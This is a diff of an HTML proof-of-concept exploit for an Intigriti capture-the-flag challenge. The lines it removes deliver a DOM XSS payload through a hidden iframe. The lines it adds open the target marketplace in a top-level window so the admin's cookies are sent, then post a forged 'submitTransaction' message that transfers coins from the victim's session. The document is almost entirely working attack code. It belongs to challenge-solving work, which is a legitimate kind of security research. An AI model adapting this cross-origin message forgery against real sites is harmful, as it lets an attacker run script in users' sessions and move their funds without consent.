@@ -1,37 +1,32 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>postMessage DOM XSS PoC</title>
+  <meta charset="UTF-8">
+  <title>Intigriti Challenge 0126 PoC</title>
 </head>
 <body>
+  <h1>Loading…</h1>
 
-<h2>Loading…</h2>
+  <script>
+    // Step 1: open marketplace as a top-level window
+    // This ensures admin cookies are sent (SameSite=Lax)
+    const win = window.open(
+      "https://challenge-0126.intigriti.io/marketplace.html?currency=1337COIN&price=1",
+      "_blank"
+    );
 
-<iframe
-  id="victim"
-  src="https://challenge-0126.intigriti.io/marketplace.html?currency=1337COIN&price=1"
-  style="width:1px;height:1px;border:0;"
-></iframe>
-
-<script>
-const iframe = document.getElementById("victim");
-
-iframe.onload = () => {
-  // crafted message the victim trusts
-  iframe.contentWindow.postMessage(
-    {
-      type: "submitTransaction",
-      transaction: {
-        toAddress: "<img src=x onerror=alert(1)>",
-        currency: "1337COIN",
-        amount: 1
-      }
-    },
-    "*"
-  );
-};
-</script>
-
+    // Step 2: wait for marketplace JS to initialize
+    setTimeout(() => {
+      // Step 3: exploit postMessage origin check bypass
+      win.postMessage({
+        type: "submitTransaction",
+        transaction: {
+          toAddress: "1997d44f99256913784aecf98255882ac6", // admin wallet
+          currency: "1337COIN",
+          amount: 1337
+        }
+      }, "*");
+    }, 2000);
+  </script>
 </body>
 </html>
